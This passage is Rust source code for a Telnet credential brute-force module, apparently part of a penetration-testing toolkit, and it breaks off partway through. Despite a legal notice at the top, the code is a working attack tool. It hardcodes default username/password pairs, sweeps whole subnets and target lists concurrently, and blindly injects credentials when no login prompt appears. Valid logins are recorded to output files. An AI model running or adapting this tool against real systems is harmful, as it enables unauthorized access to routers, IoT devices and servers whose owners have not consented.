// src/modules/creds/generic/telnet_bruteforce.rs - PART 1/4
// Comprehensive Telnet Security Testing Module
//
// ⚠️ LEGAL NOTICE ⚠️
// This tool is designed for AUTHORIZED security testing ONLY.
// Unauthorized access to computer systems is illegal under:
// - Computer Fraud and Abuse Act (CFAA) - USA
// - Computer Misuse Act - UK
// - Similar laws in other jurisdictions
//
// Only use this tool on systems you own or have explicit written permission to test.

use anyhow::{anyhow, Context, Result};
use colored::*;
use rand::Rng;
// use regex::Regex; // Unused
use serde::{Deserialize, Serialize};
use std::collections::{HashSet, HashMap};
use std::net::SocketAddr; // Removed ToSocketAddrs
use std::path::Path;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc,
};
// use std::time::{SystemTime, UNIX_EPOCH}; // Unused
use std::time::{Duration, Instant};
use tokio::fs::{File, OpenOptions};
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader};
use tokio::net::{TcpStream, lookup_host}; // Added lookup_host
use tokio::sync::{mpsc, Mutex, Semaphore};
use tokio::time::{sleep, timeout};
// use once_cell::sync::Lazy; // Unused

use crate::utils::{
    prompt_required, prompt_default, prompt_yes_no,
    prompt_existing_file, prompt_int_range
};

// ============================================================
// CONSTANTS
// ============================================================

const MAX_MEMORY_SIZE: u64 = 500 * 1024 * 1024;
const CHANNEL_BUFFER_MULTIPLIER: usize = 16;
const PROGRESS_INTERVAL_SECS: u64 = 3;
const BUFFER_SIZE: usize = 4096;
const RESPONSE_BUFFER_CAPACITY: usize = 2048;
const DEFAULT_TELNET_PORTS: &[u16] = &[23, 2323, 23231];
const TASK_WATCHDOG_TIMEOUT_SECS: u64 = 20;

const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", ""),
    ("admin", ""),
    ("telnet", "telnet"),
    ("support", "support"),
    ("tech", "tech"),
    ("test", "test"),
    ("oracle", "oracle"),
];

// ============================================================
// CONFIGURATION STRUCTURES
// ============================================================

#[derive(Clone, Serialize, Deserialize)]
pub struct TelnetBruteforceConfig {
    #[serde(skip)]
    pub target: String,
    pub port: u16,
    pub username_wordlist: String,
    pub password_wordlist: Option<String>,
    pub threads: usize,
    pub delay_ms: u64,
    pub connection_timeout: u64,
    pub banner_read_timeout: u64,
    pub login_prompt_timeout: u64,
    pub password_prompt_timeout: u64,
    pub auth_response_timeout: u64,
    pub command_timeout: u64,
    pub write_timeout: u64,
    pub stop_on_success: bool,
    pub verbose: bool,
    pub full_combo: bool,
    pub raw_bruteforce: bool,
    pub raw_charset: String,
    pub raw_min_length: usize,
    pub raw_max_length: usize,
    pub output_file: String,
    pub append_mode: bool,
    pub pre_validate: bool,
    pub retry_on_error: bool,
    pub max_retries: usize,
    pub login_prompts: Vec<String>,
    pub password_prompts: Vec<String>,
    pub success_indicators: Vec<String>,
    pub failure_indicators: Vec<String>,

    #[serde(skip)]
    pub login_prompts_lower: Vec<String>,
    #[serde(skip)]
    pub password_prompts_lower: Vec<String>,
    #[serde(skip)]
    pub success_indicators_lower: Vec<String>,
    #[serde(skip)]
    pub failure_indicators_lower: Vec<String>,
}

#[derive(Clone)]
pub struct BatchScanConfig {
    pub targets: Vec<String>,
    pub ports: Vec<u16>,
    pub credentials: Vec<(String, String)>,
    pub timeout: Duration,
    pub max_concurrent: usize,
    pub output_file: String,
    pub verbose: bool,
}

impl Default for BatchScanConfig {
    fn default() -> Self {
        Self {
            targets: Vec::new(),
            ports: DEFAULT_TELNET_PORTS.to_vec(),
            credentials: DEFAULT_CREDENTIALS
            .iter()
            .map(|(u, p)| (u.to_string(), p.to_string()))
            .collect(),
            timeout: Duration::from_secs(3),
            max_concurrent: 50,
            output_file: "telnet_scan_results.txt".to_string(),
            verbose: false,
        }
    }
}

#[derive(Debug, Clone)]
pub struct ScanResult {
    pub ip: String,
    pub port: u16,
    pub banner: String,
    pub credentials: Option<(String, String)>,
    pub timestamp: String,
}

impl TelnetBruteforceConfig {
    #[inline]
    pub fn preprocess_prompts(&mut self) {
        self.login_prompts_lower = self.login_prompts.iter().map(|s| s.to_lowercase()).collect();
        self.password_prompts_lower = self.password_prompts.iter().map(|s| s.to_lowercase()).collect();
        self.success_indicators_lower = self.success_indicators.iter().map(|s| s.to_lowercase()).collect();
        self.failure_indicators_lower = self.failure_indicators.iter().map(|s| s.to_lowercase()).collect();
    }
}

// ============================================================
// STATISTICS TRACKING
// ============================================================

pub struct Statistics {
    total_attempts: AtomicU64,
    successful_attempts: AtomicU64,
    failed_attempts: AtomicU64,
    error_attempts: AtomicU64,
    retried_attempts: AtomicU64,
    timeouts: AtomicU64,
    broken_pipes: AtomicU64,
    hung_tasks: AtomicU64,
    retries_queued: AtomicU64,
    start_time: Instant,
    unique_errors: Mutex<HashMap<String, usize>>,
}

impl Statistics {
    #[inline]
    pub fn new() -> Self {
        Self {
            total_attempts: AtomicU64::new(0),
            successful_attempts: AtomicU64::new(0),
            failed_attempts: AtomicU64::new(0),
            error_attempts: AtomicU64::new(0),
            retried_attempts: AtomicU64::new(0),
            timeouts: AtomicU64::new(0),
            broken_pipes: AtomicU64::new(0),
            hung_tasks: AtomicU64::new(0),
            retries_queued: AtomicU64::new(0),
            start_time: Instant::now(),
            unique_errors: Mutex::new(HashMap::new()),
        }
    }

    #[inline]
    pub fn record_attempt(&self, success: bool, error: bool) {
        self.total_attempts.fetch_add(1, Ordering::Relaxed);
        if error {
            self.error_attempts.fetch_add(1, Ordering::Relaxed);
        } else if success {
            self.successful_attempts.fetch_add(1, Ordering::Relaxed);
        } else {
            self.failed_attempts.fetch_add(1, Ordering::Relaxed);
        }
    }

    #[inline]
    pub fn record_retry(&self) {
        self.retried_attempts.fetch_add(1, Ordering::Relaxed);
    }

    #[inline]
    pub fn record_timeout(&self) {
        self.timeouts.fetch_add(1, Ordering::Relaxed);
    }

    #[inline]
    pub fn record_broken_pipe(&self) {
        self.broken_pipes.fetch_add(1, Ordering::Relaxed);
    }

    #[inline]
    pub fn record_hung_task(&self) {
        self.hung_tasks.fetch_add(1, Ordering::Relaxed);
    }

    #[inline]
    pub fn record_retry_queued(&self) {
        self.retries_queued.fetch_add(1, Ordering::Relaxed);
    }

    pub async fn record_error_kind(&self, key: &str) {
        let mut guard = self.unique_errors.lock().await;
        *guard.entry(key.to_string()).or_insert(0) += 1;
    }

    pub fn print_progress(&self) {
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        print!(
            "\r{} {} attempts | {} OK | {} fail | {} err | {} retry | {:.1}/s    ",
            "[Progress]".cyan(),
               total.to_string().bold(),
               success.to_string().green(),
               failed,
               errors.to_string().red(),
               retries,
               rate
        );
        let _ = std::io::Write::flush(&mut std::io::stdout());
    }

    pub async fn print_final(&self) {
        println!();
        let total = self.total_attempts.load(Ordering::Relaxed);
        let success = self.successful_attempts.load(Ordering::Relaxed);
        let failed = self.failed_attempts.load(Ordering::Relaxed);
        let errors = self.error_attempts.load(Ordering::Relaxed);
        let retries = self.retried_attempts.load(Ordering::Relaxed);
        let timeouts = self.timeouts.load(Ordering::Relaxed);
        let broken = self.broken_pipes.load(Ordering::Relaxed);
        let hung = self.hung_tasks.load(Ordering::Relaxed);
        let queued = self.retries_queued.load(Ordering::Relaxed);
        let elapsed = self.start_time.elapsed().as_secs_f64();
        let rate = if elapsed > 0.0 { total as f64 / elapsed } else { 0.0 };

        println!("\n{}", "[Final Statistics]".bold().cyan());
        println!("  Total attempts:  {}", total.to_string().bold());
        println!("  Successful:      {}", success.to_string().green().bold());
        println!("  Failed:          {}", failed);
        println!("  Errors:          {}", errors.to_string().yellow());
        println!("  Timeouts:        {}", timeouts);
        println!("  Broken pipes:    {}", broken);
        println!("  Hung tasks:      {}", hung);
        println!("  Retries (done):  {}", retries);
        println!("  Retries (queued):{}", queued);
        println!("  Time elapsed:    {:.2}s", elapsed);
        println!("  Average rate:    {:.2} attempts/sec", rate);
        if total > 0 {
            let success_rate = (success as f64 / total as f64) * 100.0;
            println!("  Success rate:    {:.2}%", success_rate);
        }

        // Print top error types (best-effort)
        let guard = self.unique_errors.lock().await;
        if !guard.is_empty() {
            println!("\n{}", "  Top error types:".bold());
            let mut items: Vec<_> = guard.iter().collect();
            items.sort_by(|a, b| b.1.cmp(a.1));
            for (key, count) in items.into_iter().take(5) {
                println!("    - {}: {}", key, count);
            }
        }
    }
}

// ============================================================
// MAIN ENTRY POINT
// ============================================================

pub async fn run(target: &str) -> Result<()> {
    display_banner();

    println!("Select operation mode:");
    println!("  1. Single Target Bruteforce (advanced)");
    println!("  2. Subnet Bruteforce (CIDR notation)");
    println!("  3. Batch Scanner (multiple targets)");
    println!("  4. Quick Default Check (single target)");
    println!("  5. Subnet Default Check (CIDR)");
    println!();

    let mode = prompt_required("Select mode [1-5]: ").await?;

    match mode.as_str() {
        "1" => run_single_target_bruteforce(target, false).await,
        "2" => run_single_target_bruteforce(target, true).await,
        "3" => run_batch_scanner(target).await,
        "4" => run_quick_check(target, false).await,
        "5" => run_quick_check(target, true).await,
        _ => {
            println!("[!] Invalid selection");
            Ok(())
        }
    }
}

// ============================================================
// BASIC HONEYPOT DETECTION
// ============================================================

// ============================================================
// MODE 1 & 2: SINGLE TARGET / SUBNET BRUTEFORCE
// ============================================================

async fn run_single_target_bruteforce(target: &str, is_subnet: bool) -> Result<()> {
    println!("\n{}", if is_subnet {
        "=== Subnet Bruteforce Mode ==="
    } else {
        "=== Single Target Bruteforce Mode ==="
    }.bold().cyan());
    println!();

    let targets = parse_single_target(target)?;

    if targets.len() > 1 {
        println!("[*] Expanded to {} hosts", targets.len());
        if !prompt_yes_no("Continue with all hosts? (y/n): ", true).await? {
            return Ok(());
        }
    }

    let target_primary = targets[0].clone();

    let use_config = prompt_yes_no("Do you have a configuration file? (y/n): ", false).await?;

    let mut config = if use_config {
        println!();
        print_config_format();
        println!();

        let config_path = prompt_wordlist("Path to configuration file: ").await?;

        println!("[*] Loading configuration from '{}'...", config_path);
        match load_and_validate_config(&config_path, &target_primary).await {
            Ok(cfg) => {
                println!("{}", "[+] Configuration loaded and validated!".green().bold());
                cfg
            }
            Err(e) => {
                eprintln!("{}", "[!] Configuration validation failed:".red().bold());
                eprintln!("    {}", e.to_string().yellow());
                return Err(e);
            }
        }
    } else {
        build_interactive_config(&target_primary).await?
    };

    config.preprocess_prompts();
    print_config_summary(&config);

    if !prompt_yes_no("\nProceed with this configuration? (y/n): ", true).await? {
        println!("[*] Aborted by user.");
        return Ok(());
    }

    if !use_config && prompt_yes_no("\nSave this configuration? (y/n): ", false).await? {
        let save_path = prompt_required("Configuration file path: ").await?;
        if let Err(e) = save_config(&config, &save_path).await {
            eprintln!("[!] Failed to save config: {}", e);
        } else {
            println!("[+] Configuration saved to '{}'", save_path);
        }
    }

    println!();
    println!("{}", "[Starting Attack]".bold().yellow());
    println!();

    if targets.len() > 1 {
        let parallel = prompt_yes_no("Run targets in parallel? (y/n): ", false).await?;
        if parallel {
            run_parallel_bruteforce(targets, config).await
        } else {
            run_sequential_bruteforce(targets, config).await
        }
    } else {
        run_telnet_bruteforce(config).await
    }
}

async fn run_sequential_bruteforce(targets: Vec<String>, base_config: TelnetBruteforceConfig) -> Result<()> {
    for (idx, target) in targets.iter().enumerate() {
        println!("\n{}", format!("=== Target {}/{}: {} ===", idx + 1, targets.len(), target).bright_cyan());
        let mut config = base_config.clone();
        config.target = target.clone();

        if let Err(e) = run_telnet_bruteforce(config).await {
            eprintln!("[!] Error with target {}: {}", target, e);
        }

        if idx < targets.len() - 1 {
            sleep(Duration::from_secs(1)).await;
        }
    }
    Ok(())
}

async fn run_parallel_bruteforce(targets: Vec<String>, base_config: TelnetBruteforceConfig) -> Result<()> {
    let max_concurrent = prompt_threads(5).await?;
    let semaphore = Arc::new(Semaphore::new(max_concurrent));
    let mut tasks = Vec::new();

    for target in targets {
        let sem = semaphore.clone();
        let config = base_config.clone();

        let task = tokio::spawn(async move {
            let _permit = sem.acquire().await.unwrap();
            let mut target_config = config;
            target_config.target = target.clone();
            run_telnet_bruteforce(target_config).await
        });

        tasks.push(task);
    }

    for task in tasks {
        if let Err(e) = task.await {
            eprintln!("[!] Task error: {}", e);
        }
    }

    Ok(())
}

// ============================================================
// MODE 3: BATCH SCANNER
// ============================================================

async fn run_batch_scanner(target: &str) -> Result<()> {
    println!("\n{}", "=== Batch Scanner Mode ===".bold().cyan());
    println!();

    let mut config = BatchScanConfig::default();

    if Path::new(target).exists() {
        let content = tokio::fs::read_to_string(target).await?;
        config.targets = parse_targets(&content)?;
    } else {
        config.targets = parse_targets(target)?;
    }

    if config.targets.is_empty() {
        return Err(anyhow!("No valid targets specified"));
    }

    println!("Loaded {} target(s)", config.targets.len());

    if prompt_yes_no("Use default ports (23, 2323, 23231)? (y/n): ", true).await? {
        config.ports = DEFAULT_TELNET_PORTS.to_vec();
    } else {
        let ports_str = prompt_required("Enter ports (comma-separated): ").await?;
        config.ports = ports_str
        .split(',')
        .filter_map(|s| s.trim().parse().ok())
        .collect();
    }

    if prompt_yes_no("Use default credential list? (y/n): ", true).await? {
        config.credentials = DEFAULT_CREDENTIALS
        .iter()
        .map(|(u, p)| (u.to_string(), p.to_string()))
        .collect();
    } else {
        let cred_file = prompt_wordlist("Path to credentials file (user:pass format): ").await?;
        config.credentials = load_credentials_file(&cred_file).await?;
    }

    config.max_concurrent = prompt_threads(50).await?;
    config.verbose = prompt_yes_no("Verbose output? (y/n): ", false).await?;
    config.output_file = prompt_required("Output file: ").await?;

    println!();
    println!("Configuration:");
    println!("  Targets:      {}", config.targets.len());
    println!("  Ports:        {:?}", config.ports);
    println!("  Credentials:  {}", config.credentials.len());
    println!("  Concurrency:  {}", config.max_concurrent);
    println!();

    if !prompt_yes_no("Start scan? (y/n): ", true).await? {
        println!("Scan cancelled");
        return Ok(());
    }

    println!();
    execute_batch_scan(config).await
}

// ============================================================
// MODE 4 & 5: QUICK DEFAULT CHECK
// ============================================================

async fn run_quick_check(target: &str, is_subnet: bool) -> Result<()> {
    println!("\n{}", if is_subnet {
        "=== Subnet Quick Default Check ==="
    } else {
        "=== Quick Default Credential Check ==="
    }.bold().cyan());
    println!();

    let targets = if is_subnet {
        parse_single_target(target)?
    } else if Path::new(target).exists() {
        let content = tokio::fs::read_to_string(target).await?;
        parse_targets(&content)?
    } else {
        vec![target.to_string()]
    };

    let port: u16 = prompt_required("Port (default 23): ").await?
    .parse()
    .unwrap_or(23);

    let verbose = prompt_yes_no("Verbose mode? (show all attempts and details) (y/n): ", false).await?;

    println!();
    println!("Testing {} target(s) on port {} with {} default credentials...",
             targets.len(), port, DEFAULT_CREDENTIALS.len());
    if verbose {
        println!("{}", "[*] Verbose mode enabled - showing all attempts and details".cyan());
    }
    println!();

    let mut found_any = false;
    let mut results = Vec::new();
    let mut total_attempts = 0;
    let mut successful_attempts = 0;
    let mut failed_attempts = 0;
    let mut error_attempts = 0;

    for (target_idx, target_ip) in targets.iter().enumerate() {
        println!("{}", format!("[*] Testing {}:{} ({}/{})", target_ip, port, target_idx + 1, targets.len()).bold());
        if verbose {
            println!("  Target: {}:{}", target_ip, port);
            println!("  Testing {} default credential pairs...", DEFAULT_CREDENTIALS.len());
        }

        for (cred_idx, (username, password)) in DEFAULT_CREDENTIALS.iter().enumerate() {
            total_attempts += 1;

            if verbose {
                print!("  [{}/{}] Testing {}/{}... ",
                       cred_idx + 1,
                       DEFAULT_CREDENTIALS.len(),
                       username,
                       if password.is_empty() { "(blank)" } else { password });
                let _ = std::io::Write::flush(&mut std::io::stdout());
            }

            match try_telnet_login_simple(&target_ip, port, username, password, 3).await {
                Ok(true) => {
                    successful_attempts += 1;
                    let result = format!("{}:{} - {}/{}",
                                         target_ip, port, username,
                                         if password.is_empty() { "(blank)" } else { password });

                    if verbose {
                        println!(
                            "\r  [{}/{}] {} Valid: {}/{}",
                            cred_idx + 1,
                            DEFAULT_CREDENTIALS.len(),
                                 "✓".bright_green().bold(),
                                 username,
                                 if password.is_empty() { "(blank)" } else { password }
                        );
                    } else {
                        println!(
                            "  {} Valid: {}/{}",
                            "✓".bright_green().bold(),
                                 username,
                                 if password.is_empty() { "(blank)" } else { password }
                        );
                    }
                    results.push(result);
                    found_any = true;
                }
                Ok(false) => {
                    failed_attempts += 1;
                    if verbose {
                        println!("\r  [{}/{}] {} Invalid: {}/{}",
                                 cred_idx + 1,
                                 DEFAULT_CREDENTIALS.len(),
                                 "✗".red(),
                                 username,
                                 if password.is_empty() { "(blank)" } else { password });
                    }
                }
                Err(e) => {
                    error_attempts += 1;
                    let error_type = classify_telnet_error(&e.to_string());
                    if verbose {
                        println!("\r  [{}/{}] {} Error ({}): {}",
                                 cred_idx + 1,
                                 DEFAULT_CREDENTIALS.len(),
                                 "!".yellow(),
                                 error_type,
                                 e);
                    } else {
                        println!("  {} Error: {}", "!".yellow(), e);
                    }
                    // Don't break on error in verbose mode - continue testing
                    if !verbose {
                        break;
                    }
                }
            }
            sleep(Duration::from_millis(200)).await;
        }
        println!();
    }

    // Print summary
    if verbose {
        println!("{}", "=== Quick Check Summary ===".bold().cyan());
        println!("  Total attempts:    {}", total_attempts);
        println!("  Successful:       {}", successful_attempts.to_string().green().bold());
        println!("  Failed:           {}", failed_attempts);
        println!("  Errors:           {}", error_attempts.to_string().yellow());
        if total_attempts > 0 {
            let success_rate = (successful_attempts as f64 / total_attempts as f64) * 100.0;
            println!("  Success rate:     {:.1}%", success_rate);
        }
        println!();
    }

    if !found_any {
        println!("{}", "[-] No valid credentials found".yellow());
    } else {
        println!("{}", format!("[+] Found {} valid credential(s)", results.len()).green().bold());
        if verbose {
            println!("  Valid credentials:");
            for result in &results {
                println!("    - {}", result);
            }
            println!();
        }

        if prompt_yes_no("Save results to file? (y/n): ", true).await? {
            let output_path = prompt_required("Output file path: ").await?;
            save_quick_check_results(&output_path, &results).await?;
            println!("[+] Results saved to '{}'", output_path);
        }
    }

    Ok(())
}

async fn save_quick_check_results(path: &str, results: &[String]) -> Result<()> {
    let mut f = File::create(path).await?;
    f.write_all(b"# Quick Check Results\n").await?;
    f.write_all(format!("# Date: {}\n\n", chrono::Local::now()).as_bytes()).await?;
    for result in results {
        f.write_all(format!("{}\n", result).as_bytes()).await?;
    }
    f.flush().await?;
    Ok(())
}

// src/modules/creds/generic/telnet_bruteforce.rs - PART 2/4
// Core Login Functions and Execution Logic

// ============================================================
// CORE TELNET LOGIN FUNCTIONS
// ============================================================

#[derive(Debug, PartialEq, Clone, Copy)]
enum TelnetState {
    WaitingForBanner,
    WaitingForLoginPrompt,
    SendingUsername,
    WaitingForPasswordPrompt,
    SendingPassword,
    WaitingForResult,
}

#[inline]
async fn try_telnet_login(
    socket: &SocketAddr,
    username: &str,
    password: &str,
    config: &TelnetBruteforceConfig,
) -> Result<bool> {
    // Attempt 1: Standard
    let (success, banner_seen) = do_telnet_login(socket, username, password, config, false).await?;
    if success {
        return Ok(true);
    }

    // If failed and no banner seen (blind), retry blind pass only
    if !banner_seen {
        let (success_retry, _) = do_telnet_login(socket, username, password, config, true).await?;
        if success_retry {
            return Ok(true);
        }
    }

    Ok(false)
}

async fn do_telnet_login(
    socket: &SocketAddr,
    username: &str,
    password: &str,
    config: &TelnetBruteforceConfig,
    force_password_only: bool,
) -> Result<(bool, bool)> {
    let stream = timeout(
        Duration::from_secs(config.connection_timeout),
                         TcpStream::connect(socket),
    )
    .await
    .map_err(|_| anyhow!("Connection timeout"))?
    .map_err(|e| {
        let error_msg = format!("{}", e);
        let error_type = classify_telnet_error(&error_msg);
        anyhow!("{}: {}", error_type, e)
    })?;

    let (reader, mut writer) = tokio::io::split(stream);
    let mut reader = BufReader::with_capacity(BUFFER_SIZE, reader);
    let mut buf = bytes::BytesMut::with_capacity(BUFFER_SIZE);
    let mut response_after_pass = String::with_capacity(RESPONSE_BUFFER_CAPACITY);
    let mut recent_buffer = String::with_capacity(2048); // Track recent output regardless of state
    let mut banner_detected = false;

    let mut state = TelnetState::WaitingForBanner;
    let start_time = Instant::now();
    let max_duration = Duration::from_secs(config.connection_timeout +
    config.login_prompt_timeout +
    config.password_prompt_timeout +
    config.auth_response_timeout + 5);

    loop {
        if start_time.elapsed() > max_duration {
            return Err(anyhow!("Total operation timeout"));
        }

        // --- READ PHASE ---
        // Dynamically adjust timeout based on state
        let current_timeout = match state {
            TelnetState::WaitingForBanner => Duration::from_secs(config.banner_read_timeout),
            TelnetState::WaitingForLoginPrompt => Duration::from_secs(config.login_prompt_timeout),
            TelnetState::WaitingForPasswordPrompt => Duration::from_secs(config.password_prompt_timeout),
            TelnetState::WaitingForResult => Duration::from_secs(config.auth_response_timeout),
            _ => Duration::from_millis(100), // Short timeout for sending states
        };

        // If we need to read
        let need_read = match state {
            TelnetState::SendingUsername | TelnetState::SendingPassword => false,
            _ => true
        };

        if need_read {
            let buf_len_before = buf.len();
            let read_result = timeout(current_timeout, reader.read_buf(&mut buf)).await;

            match read_result {
                Ok(Ok(0)) => {
                    // EOF handling
                    match state {
                        TelnetState::WaitingForResult => {
                            // If we already sent password and got EOF, maybe it's a success closed loop (rare but happens)
                            // or a failure closed loop. Check buffer.
                            if has_success_indicators(&response_after_pass) {
                                return Ok((true, banner_detected));
                            }
                            // Check for clean close
                            match classify_eof(&response_after_pass, true, true, 1) {
                                EofType::CleanClose => return Ok((false, banner_detected)), // Failed auth usually closes cleanly
                                _ => return Ok((false, banner_detected))
                            }
                        },
                        _ => return Err(anyhow!("Unexpected EOF in state {:?}", state))
                    }
                }
                Ok(Ok(_)) => {
                    // Extract new data
                    let new_data = if buf_len_before <= buf.len() {
                        buf.split_off(buf_len_before)
                    } else {
                        buf.split_off(0)
                    };

                    // Handle IAC
                    let (clean_bytes, iac_responses) = process_telnet_iac(&new_data);

                    if !iac_responses.is_empty() {
                        let _ = timeout(Duration::from_millis(config.write_timeout), writer.write_all(&iac_responses)).await;
                    }

                    let output = String::from_utf8_lossy(&clean_bytes).to_string();
                    let clean_output = strip_ansi_escape_sequences(&output);
                    let lower = clean_output.to_lowercase();

                    // Append to recent buffer for prompt matching (keep size sane)
                    recent_buffer.push_str(&lower);
                    if recent_buffer.len() > 2048 {
                        let split_idx = recent_buffer.len() - 1024;
                        recent_buffer = recent_buffer[split_idx..].to_string();
                    }

                    // If waiting for result, accumulate
                    if state == TelnetState::WaitingForResult {
                        if response_after_pass.len() + output.len() <= RESPONSE_BUFFER_CAPACITY {
                            response_after_pass.push_str(&output);
                        }
                    }
                }
                Ok(Err(e)) => {
                    if is_connection_error(&e) {
                        return Err(anyhow!("Connection error during read: {}", e));
                    }
                    return Err(anyhow!("Read error: {}", e));
                },
                Err(_) => {
                    // Timeout
                    // If we are waiting for result and timed out, check if we have enough info
                    if state == TelnetState::WaitingForResult {
                        // Check if we have success indicators even if timed out
                        if has_success_indicators(&response_after_pass) {
                            return Ok((true, banner_detected));
                        }
                        // If we have failure indicators
                        for indicator in &config.failure_indicators_lower {
                            if response_after_pass.to_lowercase().contains(indicator) {
                                return Ok((false, banner_detected));
                            }
                        }
                        // Fallback logic for timeout
                        return Ok((false, banner_detected));
                    }

                    // Timeout in Banner/Login wait -> Blind Injection?
                    if state == TelnetState::WaitingForBanner {
                        // If we timed out waiting for banner, assume no banner seen.
                        // Based on force_password_only, we jump state.
                        if force_password_only {
                            state = TelnetState::SendingPassword;
                        } else {
                            state = TelnetState::SendingUsername;
                        }
                        continue;
                    }

                    if state == TelnetState::WaitingForLoginPrompt {
                        // similar blind injection if we timed out waiting specifically for prompt
                        if force_password_only {
                            state = TelnetState::SendingPassword;
                        } else {
                            state = TelnetState::SendingUsername;
                        }
                        continue;
                    }
                }
            }
        }

        // --- STATE TRANSITION PHASE ---
        match state {
            TelnetState::WaitingForBanner => {
                // Check for password prompt first (password-only auth)
                let found_pass_prompt = config.password_prompts_lower.iter().any(|p| recent_buffer.contains(p));
                if found_pass_prompt {
                    banner_detected = true;
                    state = TelnetState::SendingPassword;
                } else {
                    // Check for login prompt
                    let found_login_prompt = config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p));
                    if found_login_prompt {
                        banner_detected = true;
                        state = TelnetState::SendingUsername;
                    } else {
                        // Move to waiting for prompt explicitly
                        state = TelnetState::WaitingForLoginPrompt;
                    }
                }
            }
            TelnetState::WaitingForLoginPrompt => {
                // Also check for password prompt here just in case
                let found_pass_prompt = config.password_prompts_lower.iter().any(|p| recent_buffer.contains(p));
                if found_pass_prompt {
                    state = TelnetState::SendingPassword;
                } else {
                    let found_login_prompt = config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p));
                    if found_login_prompt {
                        state = TelnetState::SendingUsername;
                    }
                }
                // If we read data but didn't match, loop again (implicit continue)
            }
            TelnetState::SendingUsername => {
                let login_data = format!("{}\r\n", username);
                timeout(Duration::from_millis(config.write_timeout), writer.write_all(login_data.as_bytes())).await??;
                // Clear buffers to avoid matching old prompts
                recent_buffer.clear();
                buf.clear();
                tokio::time::sleep(Duration::from_secs(2)).await;
                state = TelnetState::WaitingForPasswordPrompt;
            }
            TelnetState::WaitingForPasswordPrompt => {
                let found_pass_prompt = config.password_prompts_lower.iter().any(|p| recent_buffer.contains(p));
                if found_pass_prompt {
                    state = TelnetState::SendingPassword;
                }
                // If we see a login prompt again, it means username was rejected or something looped
                if config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p)) {
                    return Ok((false, banner_detected)); // Assume failed user
                }
            }
            TelnetState::SendingPassword => {
                let pass_data = format!("{}\r\n", password);
                timeout(Duration::from_millis(config.write_timeout), writer.write_all(pass_data.as_bytes())).await??;
                recent_buffer.clear();
                buf.clear();
                state = TelnetState::WaitingForResult;
            }
            TelnetState::WaitingForResult => {
                // Check success
                if has_success_indicators(&response_after_pass) {
                    return Ok((true, banner_detected));
                }
                for indicator in &config.success_indicators_lower {
                    if recent_buffer.contains(indicator) {
                        return Ok((true, banner_detected));
                    }
                }

                // Check failure
                for indicator in &config.failure_indicators_lower {
                    if recent_buffer.contains(indicator) {
                        return Ok((false, banner_detected));
                    }
                }

                // Check if it asks for login again (loopback)
                if config.login_prompts_lower.iter().any(|p| recent_buffer.contains(p)) {
                    return Ok((false, banner_detected));
                }
            }
        }
    }
}

async fn try_telnet_login_simple(
    ip: &str,
    port: u16,
    username: &str,
    password: &str,
    timeout_secs: u64,
) -> Result<bool> {
    let addr = format!("{}:{}", ip, port);
    // Use async lookup_host
    let socket = lookup_host(&addr).await?.next().ok_or_else(|| anyhow!("Cannot resolve"))?;

    let mut stream = timeout(
        Duration::from_secs(timeout_secs),
                             TcpStream::connect(socket)
    )
    .await??;

    let mut buffer = vec![0u8; 1024];

    // Read initial prompt
    timeout(Duration::from_secs(2), stream.read(&mut buffer)).await.ok();

    // Send username
    stream.write_all(format!("{}\n", username).as_bytes()).await?;
    stream.flush().await?;
    sleep(Duration::from_millis(300)).await;

    // Wait for password prompt
    timeout(Duration::from_secs(2), stream.read(&mut buffer)).await.ok();

    // Send password
    stream.write_all(format!("{}\n", password).as_bytes()).await?;
    stream.flush().await?;
    sleep(Duration::from_millis(500)).await;

    // Read response
    let n = match timeout(Duration::from_secs(2), stream.read(&mut buffer)).await {
        Ok(Ok(n)) => n,
        _ => return Ok(false),
    };

    let response = String::from_utf8_lossy(&buffer[..n]).to_lowercase();

    let success = ["#", "$", ">", "welcome", "last login"]
    .iter()
    .any(|indicator| response.contains(indicator));

    let failure = ["incorrect", "failed", "denied", "invalid"]
    .iter()
    .any(|indicator| response.contains(indicator));

    Ok(success && !failure)
}

// ============================================================
// BRUTEFORCE EXECUTION
// ============================================================

async fn run_telnet_bruteforce(config: TelnetBruteforceConfig) -> Result<()> {
    let target_str = crate::utils::normalize_target(&config.target)?;
    let addr_str = if target_str.contains(':') {
        target_str
    } else {
        format!("{}:{}", target_str, config.port)
    };

    // Resolve DNS once here
    let socket_addr = lookup_host(&addr_str).await?.next().context("Unable to resolve target")?;

    println!("[*] Target resolved to: {}", socket_addr);

    if config.pre_validate {
        println!("[*] Validating target is Telnet service...");
        match validate_telnet_target(&addr_str, &config).await {
            Ok(_) => println!("{}", "[+] Target validation successful".green()),
            Err(e) => {
                eprintln!("{}", format!("[!] Warning: {}", e).yellow());
                if !prompt_yes_no("Continue anyway? (y/n): ", false).await? {
                    return Err(anyhow!("Target validation failed"));
                }
            }
        }
    }

    let username_size = tokio::fs::metadata(&config.username_wordlist).await?.len();
    let password_size = if let Some(ref path) = config.password_wordlist {
        tokio::fs::metadata(path).await?.len()
    } else {
        0
    };

    let total_size = username_size + password_size;
    let use_streaming = should_use_streaming(total_size).await?;

    let (usernames, passwords, username_count, password_count) = if use_streaming {
        load_wordlists_streaming(&config).await?
    } else {
        load_wordlists_memory(&config).await?
    };

    println!("[*] Loaded {} username(s)", username_count);
    if password_count > 0 {
        println!("[*] Loaded {} password(s)", password_count);
    }

    let estimated_total = calculate_estimated_attempts(&config, username_count, password_count);
    println!("[*] Estimated total attempts: {}", estimated_total);
    println!();

    let output_file = Arc::new(config.output_file.clone());
    initialize_output_file(&output_file, &config).await?;

    // Create buffered result writer for efficient I/O
    let result_writer = Arc::new(Mutex::new(BufferedResultWriter::new(&output_file).await?));

    let found_creds = Arc::new(Mutex::new(HashSet::new()));
